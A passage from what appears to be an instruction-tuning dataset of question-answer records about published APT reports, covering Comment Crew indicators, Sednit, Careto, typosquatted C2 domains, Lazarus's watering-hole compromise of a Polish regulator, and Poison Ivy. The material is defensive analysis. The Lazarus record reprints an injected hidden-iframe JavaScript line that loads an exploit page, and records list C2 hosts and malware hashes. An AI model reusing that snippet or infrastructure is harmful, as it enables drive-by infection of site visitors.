    "instruction": "Context: Small Headline: Internet protocol addresses\n\uf0b7 140.116.70.8\n\uf0b7 143.89.35.7\n\uf0b7 143.89.35.7\n\uf0b7 150.176.164.6\n\uf0b7 202.105.39.39\n\uf0b7 202.39.61.136\n\uf0b7 202.6.235.83\n\uf0b7 203.200.205.245\n\uf0b7 204.111.73.150\n\uf0b7 209.124.51.194\n\uf0b7 209.124.51.219\n\uf0b7 209.161.249.125\n\uf0b7 209.208.114.83\n\uf0b7 209.233.16.84\n\uf0b7 209.253.17.229\n\uf0b7 211.232.57.235\n\uf0b7 212.130.19.154\n\uf0b7 218.232.66.12\n\uf0b7 218.233.206.2\n\uf0b7 218.234.17.30\n\uf0b7 24.73.192.154\n\uf0b7 46.149.18.151\n\uf0b7 60.248.52.95\n\uf0b7 61.219.67.1\n\uf0b7 63.192.38.11\n\uf0b7 64.80.153.108\n\uf0b7 65.105.157.228\n\uf0b7 65.110.1.32\n\uf0b7 65.114.195.226\n\uf0b7 65.89.173.68\n\uf0b7 66.151.16.30\n\uf0b7 66.155.114.145\n\uf0b7 66.170.3.43\n\uf0b7 66.228.132.53\n\uf0b7 66.228.132.8\n\uf0b7 68.17.104.162\n\uf0b7 68.96.31.136\n\uf0b7 69.20.5.219\n\uf0b7 69.25.50.10\n\uf0b7 69.28.168.10\n\uf0b7 69.74.43.87\n\uf0b7 69.90.123.6\n\uf0b7 69.90.18.22\n\uf0b7 69.90.18.23\n\uf0b7 70.108.241.36\n\uf0b7 70.62.232.98\n\uf0b7 74.86.197.56\n\uf0b7 74.93.92.50\n\uf0b7 78.95.63.1\nSmall Headline: File MD5 hashes:\n00b61db083b07a64fb6072b42aa83dc1 0136ab6d2e507d4e63990b196121d41c 017c03ad61f89ee6597ead40cc552aef 019cb1a6776f0e0d353814711e9e171b 02043566d027445374a1f7f0fc35d495 025dc68c8e06d6488e338dcc55b295eb 026c1532db8125fbae0e6aa1f4033f42 02c9a3c3efd52e43dbf53e0995a7a24e 051caf12c36662d946fd0146cd199db5 05269f5236bd89b66f6f4694abef6222 05c63c450d4d2aeb23053a6b6f8275b0 05df8d890eb18614a7d206b41453d306 086e91fa95136ad1d814cac327543bf9 08ac41ce00bf436a3dc23c4639d5f5ed 0925fb0f4c06f8b2df86508745dbacb1 09a6d5b54e8c48ed33189ebf80df750d 09c0f3a3099b6b38ec36d001361edd98 0a98bfa4bef1eb755c9c154963b69dc8 0aa4e635a61038a621d9264e33b4bc3f 0b33a683812124d99de45c8e84dc9013 0b6755e61840378952d69630b5c23e41 0c6f8665dd18d5e86124c7bfbf3207f0 0cdfea216d117cc97845edb9becaa498 0d335de3c082627cd0c5699aa6012b7d\n834a274599aed64959b3b2bfe931af4c 83cdbc9aa1907d55dda3e28149e897cc 83d45d80682afa9b2526029b2bc2fb33 850ac92dfa39f2391addc2d888c62ef8 8548dd501aaf132b134aa3849e15d2aa 85873c12599490a0f7db691b0c5179ae 860d5840c3b1a750d8c4e6bc68ecfbab 867d80bc1c369ca7ee429c727d2c5fea 875cb4844bc03f6da7a60553632c7678 888eadff6982de01c60891ce185473b7 88c0e5a4ca408ac12acaaf7a9ef9eb49 894ef915af830f38499d498342fdd8db 8a413af90665ca7909bcdcf19cd566ed 8ac64b904c188ef6b73dbc5073cee1a9 8b69f0a948c32288f3fab4ed2845cb1b 8ba366ef5ecd802c82289dcea22b2146 8c148fe80ae705af284b92f1c283013a 8c3a791ce682e3c5da5bcfbce261eeaa 8c76de0a8ac79536b96619613960681c 8d3a6b78118b647a7f31f06a46c27fd4 8dc7eb49fe1fbf490f90c153a71c60a5 8e2e709c01ccb286c51ac9e592eea48a 8e53ad954f05d2c3f57b19b1ecb0fea0 8f8e948a2f9afd7ece6dc6603cfbd56a 8fbbf38c053dbb0da3dd2fd6af4869d2 905d5cd372fb22dd5f9804adb2d2787b 9157d078effa4b727180c40bedb74ef6 920dffe40787f1f3fdb24548b4a210db 92785f445f366ed548388b1af6b01f9c 9327f1eefb18fde7f622fc2efbbbdb4b 939e07685fec28a15f88786b097bb14b 9400950fa381ba1750c914fa9e6fd85e 942b1ca8c3c64be1e4c40e26c9e39ad8 962c52436706b5c226894de0436b860e 96ee5acbe155f37ff1604b4fd259e55f 96f31d6fda587b43887e846876e5c399 975c718bf93ca5d0693bb0d4c7e42d1e 99b58e416c5e8e0bcdcd39ba417a08ed 9a58902740c5b73eb6a68a126ac6ac55 9a847c1f54359ffd3c335e97600f6f5d 9aca099f7cd3b3b29551b67af48467d1 9be590614e2407dc144ad6c100a2873a 9bf4683c09a2d60294ff79ce026f4e64 9cc15358d6ce18150dbee6be3281151d 9cd1e3b67540bdc2fc4a3835e170bc65 9e6b8b265f05302eca455ce8ea10a3aa 9fcb233ee18df6c19b1ad3922dd41a2a 9fd0e94fce1543b75b44414a61b252b0 a01ea69e4c10721ec088676cef67d8bd a19e68e72084d867a39776faaa6f5fce a1fa946523928c16340cf40daa2ffb53 a26a85c33ddf57d720040629931be174 a4847e655c817e3c5112e888a2877f4d a4d476fb7b084bd01a847ab7e0d839b5 a55f6c8b795ccdc469b9b67b22ddc88b\na637ea307380ba21a355c3cffd37639a a6cba31fcca49ff9ed6fd9894644de9e a76f0fada1602e9c119cba24306442b4 a98d2c90b9494fc885c7cd35d43666ea a9c20499d43f9674cc37dbfa81381203 a9d2caa6ebbfd5be071748e59e754cf4 a9e0a604e5b8ed5f4f286c3355d7a0fb aaa01f776acabdf9f07ea3eaff1695d6 ac2b219ede57f9d14cdce38e987862aa ac9e0b2af215821f7223b6eaeaea03db ad95f613fc4b644bd5e3230eb0b5dbcc adb97252b05a6e82697bf93c347bdf25 aea5dc22e706c836d056f4ba1f13dea3 af285fa9a141f422b8ccbfb4e9a00054 b18cabead7248e8156230c71399b79c9 b19ef1134f54b4021f99cc45ae1bc270 b1c540b4b9c8a87a1e87a76ed289f18d b2784e4dc6e602d9d6bf09325bba8c4e b29556856203049b9e7b05e01f5ae73f b3056919871fc01a1ed3294e2014e0c4 b41c02eb41070e0a2e459abf2fc39b69 b44cd1fa5d8beb08519bbe0c1d796b0f b457372a87597b746ce69e05c4a7d3fa b653012d2bfa4e3419d97eb9f2e5ed4a b665ea35f8f7954657eed1e54517843d b68eadb2a8069c7e88535e1ebfb4be0a b8c83b3549ebb24b3e00dd23c2aa050a b8f77674d292d205f8f5cf6c3f3c34df b8fdf06f78341581870477574e2b08c3 b921e0d11127af9613804c63cddd86ca b9367aba4f267b82a838223df016bd6b b96b79f4f1b4306ac2c63fc988305fb0 ba700e3a83fec3cc984e1fb572aa0add bbb4bdd1d7e8589d145163f1efd458f5 bbbf285e8344f7df330f93c7c3baf27f bbccf8643368c80dd083fb92d67d00be bbdce1e1991f292d366097a743da3724 bcc6addece28265390b2d535d65c49b8 bd6481ed6dfe67ba9f2f8f26e2cee722 bdf512d5eef853d07c0db345345e3db7 be3799da210edb81143d609e66e5b7ff be54e3660bf928b8b5f764f5cdfdc4da bf18ef997b7d589f031f47799a33f27b bf65727accaa53d65c31ed5b582053c5 bf778439895829ff986207900bfcfe02 c1438390098e4dc7bb8b52efcf1d2465 c1919e6f2e05feb9dc9b6ab9f81dcb2f c243a7c1cf23b91f73100bb9e947439e c32696b255bac4b849fc249e56944a91 c376aecf43bf021b6408ca99cd31da01 c5062bbbb15911a63de77a66773874d9 c63cc0a8b0b3a70f7b835a3fff9f02a5 c8607553e37cc1fc870572670c1910f5 c89d4d40e4b68a9952121b62b0dda920 c9570396c897e02ec8aa195c6241f945\nc9a32616f89dc953486bd1b5d83359ec c9b4c4d65298dc10be6784d0f0ad8519 c9f19071bac9d4eb3b08b4017c0d9c4d cac3bc3039cd73935051ad8df2e53d34 cb40ff3b3ed8c1966defbe1dafdd1326 cca75af9786d7364866f40b80dddcc5c cd5f3dbea197dc5afb673e42f0e9c3fe cdc0c4fdc649dec017ace0f2898068d0 cec766518fa5b607157e92e9c24c0d03 cf5356cdf42d264d5213cce4cd415f0b cf96139290c09963a32506cd85825ed3 d3174652816010a7f6d8f4523ee3a077 d4036f03c760084cc677edf4ee6c4a39 d46d261ec92daf703cd584f10037198c d5027d35c8bd9e867113bd4a1edb931f d58323fb222b9ff681c0982ba286a296 d6b1989d9c271b8575326e4fca159ae8 d6b198eda724e2b3367502a6a2232939 d6b467c92256094f720e9fc75f149737 d6d5aeb79899485f5734bf8847782266 d6e98d062d7900c6fe9a6d7f0b1d7fec d6ff4333eb1a2305d5b6cf4705213393 d795292ea23217480ad92939daf6dd22 d83055efe66377067ce99d99c706f19a d8f7aaad3677fac1cde911c7362c2b69 d910d21bd54b63ef61b3f250fe73dcc6 da451674bb68804b390bd7413691c91e dab17bcceae6f32eae5d800d0d3f9e46 db6ae6da64f14168b3624e26191277cf db7d3724e5f004168a1a56f6b9de3cd5 dd5aad5d66bc96e5ac60cbe5d132c2ec de5eeb9847a5fbc1a6cbb4cfb8bb6aa0 df53ce3797932d9e62ceaa760a3f0e3e dfaa6250dc947602d5dc200e503f23a5 dff3a274e5fa35013601c7985bf13d56 dff7ac111e48115e208c2649b94b1115 e0b3a0fd042ff50e0de22725864775b8 e1117ec1ea73b6da7f2c051464ad9197 e2494eba419891c0c101af74eb8c029c e2620e1cf89830e8de1e8c4530829a15 e27f0975fd3278e7303102783767c508 e2a557b39231ee91724c150e3ec4b493 e2be37df12f7b98b2b73197d77773263 e4255f51a871a95baa10b6b2c4ed2470 e62bb947d72d12311890f2e07eb6ac8b e6446d52e9f4b5c2c5a9ac850281cae8 e649b8b9e541406446da47d8d0a91385 e6ffb1c6e1508f474a69f091435454ce e85863b1de035814b4b01a2b6c477dd1 e90b037f1cbc79796fd8b1f6382c8483 e93a4f4872bf6cd8c3f0eed6017a8d41 ea823850b777993d636e4a565568f734 ead35eab94820d5a34f185d0b26b7930 ebe291e968eb5a86b4963d27352bc525 eced29c71867e375aed0da408d6b07f4\ned665cf8a48f08f8b4fed8bbf9d2d998 ee998128e20971ca4296a8a73ed79f43 eea7ae4eb726c3e05f187110090adb18 ef10f4f11032d48f7e82c0a788c0f489 efaadcfa4271c50927ab817e0c4a0bc3 f0a00cfd891059b70af96b807e9f9ab8 f15cff24d8a3a9ffce590cc8e69baec9 f1c4b919fdf008a8400189562f5e2fba f29cb80bde4af21c226596e9d125795d f2f2cad79dcfb356db7b2485c7a27f03 f643fa851203e9159c9dc50e4ab8d81e f74ec871c77e4b5e5b2ae0917b1f0f21 f7820d429d3185ad00e6758c343e29ce f82d3b270b16780044817978f4f3fe1a f9d2c3e8f81b9c44a1837478b2a98e5e fb0b900de6d286321fd6d20c6c4f5679 fbb0c14cacc60fdd393fb5889d5a0b57 fc97b89541b149e0dd9937ba876b3ee1 fd130b2bce93caf18bc23f1526daae99 fd31f952637370a30d74c2a65ba8d2cd fd9b5c35c042a6c462187067fb869aac fde5e109bfab33964564f387f8940030 fe568a370aa3d2c78125ab37c16484d1\nSmall Headline: Subject lines\n\uf0b7 Capt [REMOVED] update\n\uf0b7 Fw: LES Request\n\uf0b7 Libya crisis\n\uf0b7 Five Simple Questions for Democrats on Spending Cuts\n\uf0b7 Behind the Easing of Israeli-Palestinian Tensions\n\uf0b7 Business Exec Urges Broad Trade Agenda To Curb China Role In Latin America\n\uf0b7 President Chavezs Comments About President Obama and the United States on Sundays \"Alo,Presidente\"\n\uf0b7 FW: New Standdard Operational Procedures (SOPs) between the\n\uf0b7 AGENDA\n\uf0b7 [REMOVED] Help You Save Enough for Retirement\n\uf0b7 Human right of north Afica under war\n\uf0b7 Spreading Civil Unrest in the Middle East and North Africa\n\uf0b7 The latest analysis on Syria\n\uf0b7 International Atomic Energy Agency invite you to attend Atomic Energy Summit\n\uf0b7 GAC Monthly Report\n\uf0b7 Emergency notification\n\uf0b7 Meeting information of [REMOVED]\n\uf0b7 Meeting information of [REMOVED]\n\uf0b7 Meeting notice from [REMOVED]\n\uf0b7 Meeting notice from [REMOVED]\n\uf0b7 FY12 Government Opportunities\n\uf0b7 Yemen para for SC briefing\n\uf0b7 Fighting Protectionism and Promoting Trade and Investment\n\uf0b7 Weekly Security Report\n\uf0b7 Agenda of [REMOVED] Visit in July 2011\n\uf0b7 Agenda of [REMOVED] Visit in July 2011\n\uf0b7 Obituary Notice\n\uf0b7 Updated Roster 20110712\n\uf0b7 2011 project budget\n\uf0b7 [REMOVED] National Security Seminar\n\uf0b7 Current internatinal situation surrounding Syria\n\uf0b7 New Update of Health & Medical force\n\uf0b7 FW:How to Get Free Airline Tickets\n\uf0b7 Nuclear Security and Summit Diplomacy\n\uf0b7 Fw: [REMOVED] Defence & Security Industry Mission to [REMOVED] 201\n\uf0b7 [REMOVED] heriketlik pilani\n\uf0b7 2012 Global aerospace and defense industry outlook\n\nQuestion: In the context of the Comment Crew APT report, how might an analyst use the provided list of IP addresses to enhance their defensive strategies against potential cyber threats?\n\nAnswer:",
    "output": "An analyst can use the provided list of IP addresses to enhance defensive strategies by implementing several measures. First, they can configure firewalls and intrusion detection systems (IDS) to block or monitor traffic from these IP addresses, reducing the risk of malicious activity. Additionally, they can conduct threat intelligence research to understand the geographic locations and organizations associated with these IPs, which can provide insights into the attacker's infrastructure. Furthermore, analysts can correlate these IP addresses with other indicators of compromise (IoCs) to identify patterns and improve incident response plans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did Sednit exploit the XSS vulnerability in Roundcube during Operation RoundPress, and what were the primary objectives of this operation?",
    "output": "Sednit exploited the XSS vulnerability in Roundcube by injecting malicious JavaScript code into the victim's Roundcube webmail server. The primary objectives of Operation RoundPress were to steal emails, address books, and create forwarding rules to steal incoming emails. This campaign targeted government staff in Armenia, Tajikistan, and Ukraine initially, and later expanded to organizations in Serbia, Greece, Poland, and Ukraine.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does 'The Mask' APT campaign ensure persistence and evasion on compromised systems? Describe the installation process and techniques used.",
    "output": "The 'Careto' software package, part of 'The Mask' APT campaign, ensures persistence through a standalone executable installer. The installer extracts components and sets them up on the victim machine. It is compiled with Visual Studio 2005 and contains encrypted strings and payloads. The installer checks for the presence of a 'BaseNamedObject' EVENT with '*' in the data to avoid multiple installations. It uses a fixed RC4 key for decryption. The payload is installed based on system architecture (32-bit or 64-bit) and Windows version. To evade detection, it assigns the same file timestamp as 'kernel32.dll' and modifies the EXE's resources to mimic legitimate system files. The payload is registered as a COM object via registry entries to maintain persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Possible Premera Blue Cross Infrastructure:\nRetrospective analysis of other targeted malware samples using the DTOPTOOLZ Co. digital signature led to the identi\u0141cation of an \"HttpBrowser\" / \"HttpDump\" implant MD5:\n02FAB24461956458D70AEED1A028EB9C[17]\n(OpenOf\u0141cePlugin.exe), which was \u0141rst observed on December 11, 2013. Although this malware sample is not Derusbi / Sakula, it too is strongly believed to be associated with Chinese APT activity and in fact may have also been involved in a Blue Cross Blue Shield\ntargeting campaign as early as December 2013.\n[18]\nThis particular binary is con\u0141gured to connect to the static IP address 142.91.76[.]134. Passive DNS of this IP indicates that on December 11th, 2013, the same date as the malware sample was observed, the domain prennera[.]com also resolved to 142.91.76[.]134. It is believed that the prennera[.]com domain may have been impersonating the Healthcare provider Premera Blue Cross[19], where the attackers used the same character replacement technique by replacing the \"m\" with two \"n\" characters within the faux domain, the same technique that would\nbe seen \u0141ve months later with the we11point[.]com command and control infrastructure.\nBig Headline: VAE Inc. Themed Infrastructure & Signed Malware\nAnother powerful attribute of ThreatConnect is the ability for analysts to logically group items such as atomic indicators, related documents or signatures, all of which may include individualized custom context enrichments and associations. Over time, the ability to memorialize groupings of related or like activity allows analysts to quickly uncover non-obvious relationships within their private datasets. This is exactly what happened as we continued to\ninvestigate these incidents.\nAs industry analysts and media speculated Chinese APT involvement[20] in the Anthem breach, our focus into the Derusbi / Sakula malware signed with the DTOPTOOLZ Co. digital signature shifted from the we11point[.]com incident to another cluster of activity that occurred later in May 2014. We immediately reviewed Incident 20140526B: vaeit APT[21], an incident that we initially shared to our Subscriber Community on September 29, 2014 after conducting retrospective analysis.\n[22]\nJust as was the case with the we11point[.]com and prennera[.]com\nincidents, the VAE, Inc. incident is also believed to be associated with Chinese APT espionage activity. In this case the adversary also used Derusbi / Sakula malware that was signed with the DTOPTOOLZ Co. digital signature and con\u0141gured to communicate with faux infrastructure appearing to be masquerading as internal resources for the Department of Defense Contractor VAE, Inc. Additionally, in response to an inquiry from KrebsOnSecurity,\nVAE, Inc. would later con\u0141rm[24] that it had indeed been a target of a failed spearphishing attempt in May 2014 which used the malicious faux VAE, Inc. themed domain.\nThe targeted incident relied upon the Sakula executable MD5: 230D8A7A60A07DF28A291B13DDF3351F[25] which had a XOR 0x9A encoded C2 callbacks to the IP address 192.199.254[.]126 (registered to Wehostwebsites[.]com \u2013 \"Tom Yu\" of Baoan, Shenzhen City, Guangdong Province, China) as well as a hardcoded callback to sharepoint-vaeit[.]com. Passive DNS of the static C2 IP 192.199.254[.]126 revealed a single suspicious domain of interest \u2013 topsec2014[.]com.  This domain had historic resolution around May 8, 2014 within a month of the \u0141rst observed Sakula activity using the IP 192.199.254[.]126 as C2.\n[26] Using historic Whois, we discovered that topsec2014[.]com was initially registered by li2384826402@yahoo[.]com on May 6th, 2014. Although the li2384826402@yahoo[.]com registrant is likely a reseller given that it has been observed registering several thousands of other domains, the fact that it was used to register both the faux VAE, Inc. C2 infrastructure and the overlapping domain topsec2014[.]com within the same month suggests that there may be a relationship between the client of the reseller for the VAE, Inc. infrastructure and the client for topsec2014[.]com.\n[28]\nRead the text above and answer this question: How did the attackers behind the 'HttpBrowser' / 'HttpDump' malware employ character replacement techniques to impersonate legitimate domains, and what implications does this have for detecting and mitigating such attacks?",
    "output": "The attackers used a character replacement technique to impersonate legitimate domains by slightly altering the spelling. For example, they replaced the 'm' in 'Premera' with two 'n' characters to create the faux domain 'prennera[.]com'. This technique was also seen five months later with the 'we11point[.]com' command and control infrastructure. The implications of this technique are significant for detecting and mitigating such attacks because it highlights the need for advanced detection mechanisms that can identify subtle variations in domain names. Organizations should implement measures such as domain monitoring and typo-squatting detection to catch these types of impersonations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Initial Infection.\nIn one of the incidents, we discovered that patient zero visited a compromised government website using Microsoft Internet Explorer on 10 January, 2017.\nInfected webpage URL: https://www.knf.gov[.]pl/opracowania/sektor_bankowy/index.html\nThe time of the visit is confirmed by an Internet Explorer cache file, which contains an html page body from this host.\nThe webpage loaded a Javascript resource from the same webserver referenced from the page:\nThe information provided below appeared in .\nPreliminary investigation suggests that the starting point for the infection could have been located on the webserver of a Polish financial sector regulatory body, Polish Financial Supervision Authority (www.knf.gov[.]pl). Due to a slight modification of one of the local JS files, an external JS file was loaded, which could have executed malicious payloads on selected targets.\nNote: image is a courtesy of badcyber.com\nThe unauthorised code was located in the following http://www.knf.gov[.]pl/DefaultDesign/Layouts/KNF2013/resources/accordian-src.js?ver=11 and looked like this:\nfile:\ndocument.write(\"<div id='efHpTk' width='0px' height='0px'><iframe name='forma' src='https://sap.misapor[.]ch/vishop/view.jsp?pagenum=1' width='145px' height='146px' style='left:2144px;position:absolute;top :0px;'></iframe></div>\");\nAfter successful exploitation, malware was downloaded to the workstation, where, once executed, it connected to some foreign servers and could be used to perform network reconnaissance, lateral movement and data exfiltration.\nVisiting the exploit page resulted in Microsoft Internet Explorer crashing, which was recorded with a process dump file. The dumped process included the following indicators:\nAdditional research by Kaspersky Lab discovered that the exploit file at hxxp://sap.misapor[.]ch:443/vishop/include/cambio.swf resulted in the download of a backdoor module.\nBased on our own telemetry, Kaspersky Lab confirms that sap.misapor[.]ch was compromised as well, and was spreading exploits for Adobe Flash Player and Microsoft Silverlight. Some of the known vulnerability CVEs observed in attacks originate from that website:\n1. CVE-2016-4117\n2. CVE-2015-8651\n3. CVE-2016-1019\n4. CVE-2016-0034\nThe Flash exploit used in the attacks was very similar to known exploits from the Magnitude Exploit Kit. These vulnerabilities have been patched by Adobe and Microsoft since April 2016 and January 2016 respectively.\nFig. Part of the exploit code\nInside the exploits, one can see a lot of Russian word strings, like \"chainik\", \"BabaLena\", \"vyzov_chainika\", \"podgotovkaskotiny\", etc. The shellcode downloads the final payload from: https://sap[.]misapor.ch/vishop/view.jsp?uid=[redacted]&pagenum=3&eid=00000002&s=2 &data=\nIt's worth mentioning here that Lazarus used other false flags in conjunction with this Russian exploit code. They also used some Russian words in one of the backdoors and packed the malware with a commercial protector (Enigma) developed by a Russian author. However, the Russian words in the backdoor looked like a very cheap imitation, because every native Russian speaking software developer quickly noticed how odd these commands were.\nFig. Russian words in the backdoor code.\nAt the time of research this URL was dead but we were able to find an identical one which leads to a malicious file download (MD5: 06cd99f0f9f152655469156059a8ea25, detected as TrojanBanker.Win32.Alreay.gen) from http://www.eye-watch[.]in/design/img/perfmon.dat. Interestingly, this sample was uploaded to VirusTotal from Poland and Korea in November 2016. It is a packed version of a previously known backdoor used by Lazarus attackers in Incident #1's bank.\nMedium Headline: What Made the Breach Possible\nSince the attackers didn't use any zero-days, the infiltration was successful because of non-updated software. In one case, we observed a victim running the following software:\nThe exploit breached the system running Adobe Flash Player, version 20.0.0.235. This version was officially released on 8 December, 2015.\nAdobe implemented a self-update mechanism for Flash Player some years ago and the analyzed system indeed had a scheduled job, which attempted to periodically update Adobe Flash Updater. We checked the event logs of the Task Scheduler and this task was regularly running.\nThe task was started as SYSTEM user and attempted to connect to the Internet to fetch Flash Player updates from fpdownload.macromedia.com. However, this attempt failed, either because it couldn't find the proxy server to connect to the update server, or because of missing credentials for the proxy. The last failed attempt to update Adobe Flash was dated in December 2016, a month before the breach happened. If only that updater could have accessed the\nInternet the attack would have failed. This is an important issue that may be widely present in many corporate networks.\nMedium Headline: Lateral Movement. Backup Server.\nAfter the initial breach the attackers pivoted from infected hosts and emerged to migrate to a safer place for persistence. A backup server was chosen as the next target.\nBased on traffic logs provided for our analysis, we confirmed that there were connections to known Bluenoroff C2 servers originating from infected hosts. The following information was found in the network logs:\nBy checking other non-whitelisted hosts and IP ranges we were able to identify an additional C2 server belonging to the same attackers:\nWhile this additional C2 hasn't been reported previously, there were no additional hosts found that connected to that server.\nSmall Headline: E4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C 9E 3A 8F 98\nFull technical details about this malware are available in the Appendix.\nThe decrypted configuration file contains references to two previously known1 Bluenoroff C2 servers:\n\u25cf tradeboard.mefound[.]com:443\n\u25cf movis-es.ignorelist[.]com:443\nAnother file created around the same time was found in:\n\u25cf C:\\Windows\\Temp\\tmp3363.tmp.\nIt included a short text file which contained the following text message:\n[SC] StartService FAILED 1053:\nThe service did not respond to the start or control request in a timely fashion.\nAdditional searches by events which occurred around the same time brought some evidence of other command line executable modules and Windows system tools being run on that day and later. The following Prefetch files indicate the execution of other modules:\nThis confirms the active reconnaissance stage of the attack.\nAccording to prefetch files for RUNDLL32.EXE, this executable was used to load msv2_0.dll and msv2_0.chm. References to these files were found in the prefetch data of this process.\n1 Bluenoroff is a Kaspersky Lab codename for a threat actor involved in financial targeted attacks. The most well-known attack launched by the Bluenoroff group is the Bangladesh bank heist.\n2 Same executable was run with different command line\nNote: MSDTC.EXE and GPSVC.EXE are among the commonly used filenames of these attackers in the past. While these filenames may look legitimate, their location was different from the standard system equivalents.\nStandard Windows msdtc.exe binary is usually located in\n%systemroot%\\System32\\msdtc.exe, while the attacker placed msdtc.exe in %systemroot%\\msdtc.exe for disguise. The path was confirmed from parsed prefetch files. Unfortunately the attackers have already securely wiped the msdtc.exe file in the Windows directory. We were unable to recover this file.\nThe same applies to %systemroot%\\gpvc.exe which existed on the dates of the attack but was securely wiped by the attackers later.\nBased on the timestamps we found so far, it seems that the initial infection of Host1 occurred through access from a privileged account. We looked carefully at the events preceding the infection time and found something suspicious in the Windows Security event log:\nThen, we checked if the user '[ADMIN ACCOUNT REDACTED]' had logged into the same system in the past. According to the event logs this had never happened before the attackers used it. Apparently, this user logon had very high privileges (SeBackupPrivilege,\nSeLoadDriverPrivilege, SeDebugPrivilege, SeImpersonatePrivilege), allowing the remote user to fully control the host, install system services, drivers, start processes as other users, and have full control over other processes running in the system (i.e. inject code into their memory).\nNext, we searched for other event log records related to the activity of the same account, and found several records suggesting that this account was used from Host1 to access other hosts in the same domain.\nThis indicates that the account was used to create new scheduled tasks on the remote hosts. This is one of the popular ways to remotely run new processes and propagate infections during cyber attacks.\nThen we searched for other similar attempts to start schtasks.exe remotely on other hosts and collected several of them.\n\nAnswer this question based on the above context: How did the Lazarus Group manage to initially infect the target system in one of the incidents described in the report?",
    "output": "The Lazarus Group managed to initially infect the target system by compromising a government website of the Polish Financial Supervision Authority (www.knf.gov[.]pl). The infection occurred when a user visited the compromised webpage using Microsoft Internet Explorer on 10 January, 2017. The webpage loaded a JavaScript resource that included malicious code, which then executed a payload on the target system. This led to the download of malware that could perform network reconnaissance, lateral movement, and data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nPoison Ivy is a remote access tool that is freely available for download from its official web site at www.poisonivy-rat.com. First released in 2005, the tool has gone unchanged since 2008 with v ersion 2.3.2. Poison Ivy includes features common to most Windows-based RATs, including key logging, screen capturing, video capturing, file transfers, system administration, password theft, and traffic relaying.\nPoison Ivy's wide availability and easy-to-use features make it a popular choice for all kinds of\ncriminals. But it is probably most notable for its role in many high profile, targeted APT attacks.\n1 ChopShop is available for download at https://github.com/MITRECND/chopshop.\n2 Immunity Debugger is available at http://debugger.immunityinc.com/.\n3 For more information about the BSD 2-Clause License, see the Open Source Initiative's template at http://opensource.org/licenses/BSD-2-Clause.\nThese APTs pursue specific targets, using RATs to maintain a persistent presence within the target's network. They move laterally and escalate system privileges to extract sensitive information\u2014 whenever the attacker wants to do so.4,5 Because some RATs used in targeted attacks are widely available, determining whether an attack is part of a broader APT campaign can be difficult. Equally challenging is identifying malicious traffic to determine the attacker's post-compromise activities and assess overall damage\u2014these RATs often encrypt their network communications after the initial exploit.\nIn 2011, three years after the most recent release of PIVY, attackers used the RAT to compromise security firm RSA and steal data about its SecureID authentication system. That data was subsequently used in other attacks.6 The RSA attack was linked to Chinese threat actors and described at the time as extremely sophisticated. Exploiting a zero-day vulnerability, the attack delivered PIVY as the payload.7,8 It was not an isolated incident. The campaign appears to have s tarted in 2010, with many other companies compromised.9\nPIVY also played a key role in the 2011 campaign known as Nitro that targeted chemical makers, government agencies, defense contractors, and human rights groups.10,11 Still active a year later, the Nitro attackers used a zero-day vulnerability\nin Java to deploy PIVY in 2012.12 Just recently, PIVY was the payload of a zero-day exploit in Internet Explorer used in what is known as a \"strategic web compromise\" attack against visitors to a U.S. government website and a variety of others.13\nRATs require live, direct, real-time human interaction by the APT attacker. This characteristic is distinctly different from crimeware (malware focused on cybercrime), where the criminal can issue commands to their botnet of compromised endpoints whenever they please and set them to work on a common goal such as a spam relay. In contrast, RATs are much more personal and may indicate that you are dealing with a dedicated threat actor that is interested in your organization specifically.\nRead the text above and answer this question: What challenges do cybersecurity experts face when trying to identify and mitigate attacks involving widely available RATs like Poison Ivy, and how can these challenges be addressed?",
    "output": "Cybersecurity experts face several challenges when dealing with attacks involving widely available RATs like Poison Ivy. One major challenge is determining whether an attack is part of a broader APT campaign, as the widespread availability of these tools makes attribution difficult. Additionally, identifying malicious traffic to assess post-compromise activities and overall damage is challenging because these RATs often encrypt their network communications after the initial exploit. To address these challenges, experts need to employ advanced detection techniques, such as behavioral analysis and anomaly detection, to identify unusual patterns that may indicate an APT campaign. They also need to invest in robust network monitoring and encryption detection tools to better understand and respond to encrypted traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nTrend Micro researchers discovered an ongoing malware campaign that targets Israeli victims and leverages network infrastructure in Germany. The campaign has strong attribution ties to Arab parties located in the Gaza Strip and elsewhere.\nPicture the following reconstruction based on one attack\u2014an employee in an Israeli government research facility receives and opens a highly targeted phishing email. A pornographic movie starts to play on his screen, which he hurriedly closes before any of his colleagues notice. He then thinks nothing more of the event.\nMinutes later, an attacker from somewhere in the Gaza Strip in Palestine gets notified that a new victim's system has been successfully infected. The attacker then proceeds to exfiltrate a package containing all of the interesting documents from the newly infected system.\nIsrael is one of the most highly defended countries in the world, sheltered behind the legendary \"Iron Dome.\" [1] But all of that counts for nothing when an attacker\u2014 possibly seeking out revenge for Israeli air strikes on Gaza last year\u2014circumvents all of that to strike right at the heart of the Israeli administration. [2]\nThe Internet is quickly becoming a battlefield for new age wars, a chessboard where a new game is played by world powers comprising enemies and allies. This is a new take on an old game, that of deception, duplicity, and espionage in world politics. The ability to attack an enemy without needing to declare war is a very useful thing in such a game, as is being able to spy on enemies cloaked by distance and faint electronic traces.\nFor a security company, the most complicated thing is to determine the motivation behind an electronic attack. In rare cases, we do find state-sponsored espionage. And the most useful clues we count on to discern between threat actors or those behind highly targeted attacks and other cybercriminals include:\n\u2022 Complexity: The level of sophistication employed by some of these highly targeted attacks goes over and beyond normal cybercrime. Government agencies with the manpower to create the kind of malware for highly targeted attacks perfect their\ncode over the years. They often employ scores of teams working on different sections of their malicious programs.\nOf course, not all nation states have the same resources at their disposal when it comes to creating sophisticated malware. In fact, for every Stuxnet, there are hundreds of rather straightforward spear-phishing campaigns.\n\u2022 Targets: Over time, state-sponsored malware have been targeting victims that can be clustered into specific groups\u2014regions or vertical industries. This could be a telltale sign that whoever is behind a highly targeted attack has loftier interests than merely stealing money.\nIt is also worth noting that not all politically motivated attacks are carried out by the governments that would most likely benefit from 